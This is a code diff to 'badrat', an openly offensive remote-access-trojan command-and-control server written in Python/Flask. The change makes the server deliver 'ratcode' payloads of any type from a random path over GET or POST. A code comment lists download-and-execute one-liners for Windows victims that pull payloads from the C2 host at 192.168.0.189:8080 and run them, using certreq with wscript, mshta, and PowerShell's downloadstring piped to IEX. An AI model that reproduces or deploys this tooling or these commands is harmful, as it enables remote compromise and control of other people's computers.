@@ -144,7 +144,7 @@ def pretty_print_banner():
     $$ |  $$ | $$$$$$$ |$$ /  $$ |$$ |  \__| $$$$$$$ |  $$ |    \$$$$$$\        (    / _/    /' o O| ,_( ))___     (`
     $$ |  $$ |$$  __$$ |$$ |  $$ |$$ |      $$  __$$ |  $$ |$$\  \____$$\        ` -|   )_  /o_O_'_(  \\'    _ `\    )
     $$$$$$$  |\$$$$$$$ |\$$$$$$$ |$$ |      \$$$$$$$ |  \$$$$  |$$$$$$$  |          `"\"\"\"`            =`---<___/---'
-    \_______/  \_______| \_______|\__|       \_______|   \____/ \_______/  v1.3.3 Ad-Hoc HTAs              "`
+    \_______/  \_______| \_______|\__|       \_______|   \____/ \_______/  v1.3.4 Ad-Hoc PAYLOADS! :D      "`
     """
     pretty_print(banner)
 
@@ -224,12 +224,21 @@ def default_page():
     return(htmlify(message))
 
 # Allow rats to call home and request more ratcode of their own type
-def send_ratcode(ratID=None):
-    if(not ratID): # Ad hoc ratcode send
-        pretty_print("[*] sending ad-hoc " + colors("hta") + " ratcode")
-        fd = open(os.getcwd() + "/rats/badrat.hta", 'r')
-        ratcode = fd.read()
-    else:
+# Or send ad-hoc ratcode from the server. Examples of ad-hoc commands:
+# C:\ > certreq -Post -config http://192.168.0.189:8080/kqkianehiz/b.js c:\windows\win.ini a.txt & wscript /e:jscript a.txt
+# C:\ > mshta http://192.168.0.189:8080/kqkianehiz/b.hta
+# PS C:\ > (new-object net.webclient).downloadstring('http://192.168.0.189:8080/kqkianehiz/b.ps1')|IEX
+def send_ratcode(ratID=None, ratType=None):
+    if(ratType): # Ad hoc ratcode send
+        pretty_print("[*] Sending ad-hoc " + colors(ratType) + " ratcode")
+        try:
+            fd = open(os.getcwd() + "/rats/badrat." + ratType, 'rb')
+            ratcode = fd.read()
+        except:
+            pretty_print("[-] Error sending ad-hoc ratcode: No such rat exists: /rats/badrat." + ratType)
+            return(default_page())
+
+    elif(ratID): # Spawn new rat from current rat
         pretty_print("\n[*] sending " + colors(types[ratID]) + " ratcode to " + colors(ratID))
         fd = open(os.getcwd() + "/rats/badrat." + types[ratID], 'r')
         ratcode = fd.read()
@@ -358,11 +367,10 @@ def serve_server(port=8080):
     @app.route('/', defaults={'path': ''})
     @app.route('/<path:path>', methods=['GET'])
     def badrat_get(path):
-        user_agent = request.headers['User-Agent']
-        # # Path must be /documents/b.hta AND user agent belongs to mshta.exe
-        # Easy way to serve HTA's
-        if("/" + rand_path + "/b.hta"):
-            return(send_ratcode())
+        # Check to see if we are serving ad-hoc ratcode -- GET version
+        if(str.startswith(path, rand_path + "/b.")):
+            ratType = path.split(".")[1]
+            return(send_ratcode(ratType=ratType))
         elif(verbose):
             pretty_print("[v] GET request from non-rat client requested path /" + path)
         return(default_page())
@@ -370,6 +378,13 @@ def serve_server(port=8080):
     @app.route('/', defaults={'path': ''})
     @app.route('/<path:path>', methods=['POST'])
     def badrat_comms(path):
+
+        # Check to see if we are serving ad-hoc ratcode -- POST version
+        if(str.startswith(path, rand_path + "/b.")):
+            ratType = path.split(".")[1]
+            return(send_ratcode(ratType=ratType))
+
+        # We are dealing with normal rat comms
         # Parse POST parameters
         post_json = request.get_json(force=True)
         post_dict = dict(post_json)
@@ -415,7 +430,7 @@ def serve_server(port=8080):
         pretty_print("[v] Starting badrat in verbose mode. Prepare to have your screen flooded.")
 
     rand_path = ''.join(random.choice(alpha) for choice in range(10)) 
-    pretty_print("[*] Ad-Hoc " + colors("hta") + "'s servable from path: " + colors("/" + rand_path + "/b.hta"))
+    pretty_print("[*] Ad-Hoc ratcode servable from path: " + colors("/" + rand_path + "/b.<rat_type>") + " via GET or POST")
 
     # Run the listener. Choose between HTTP and HTTPS based on if --ssl was specfied
     if(ssl):
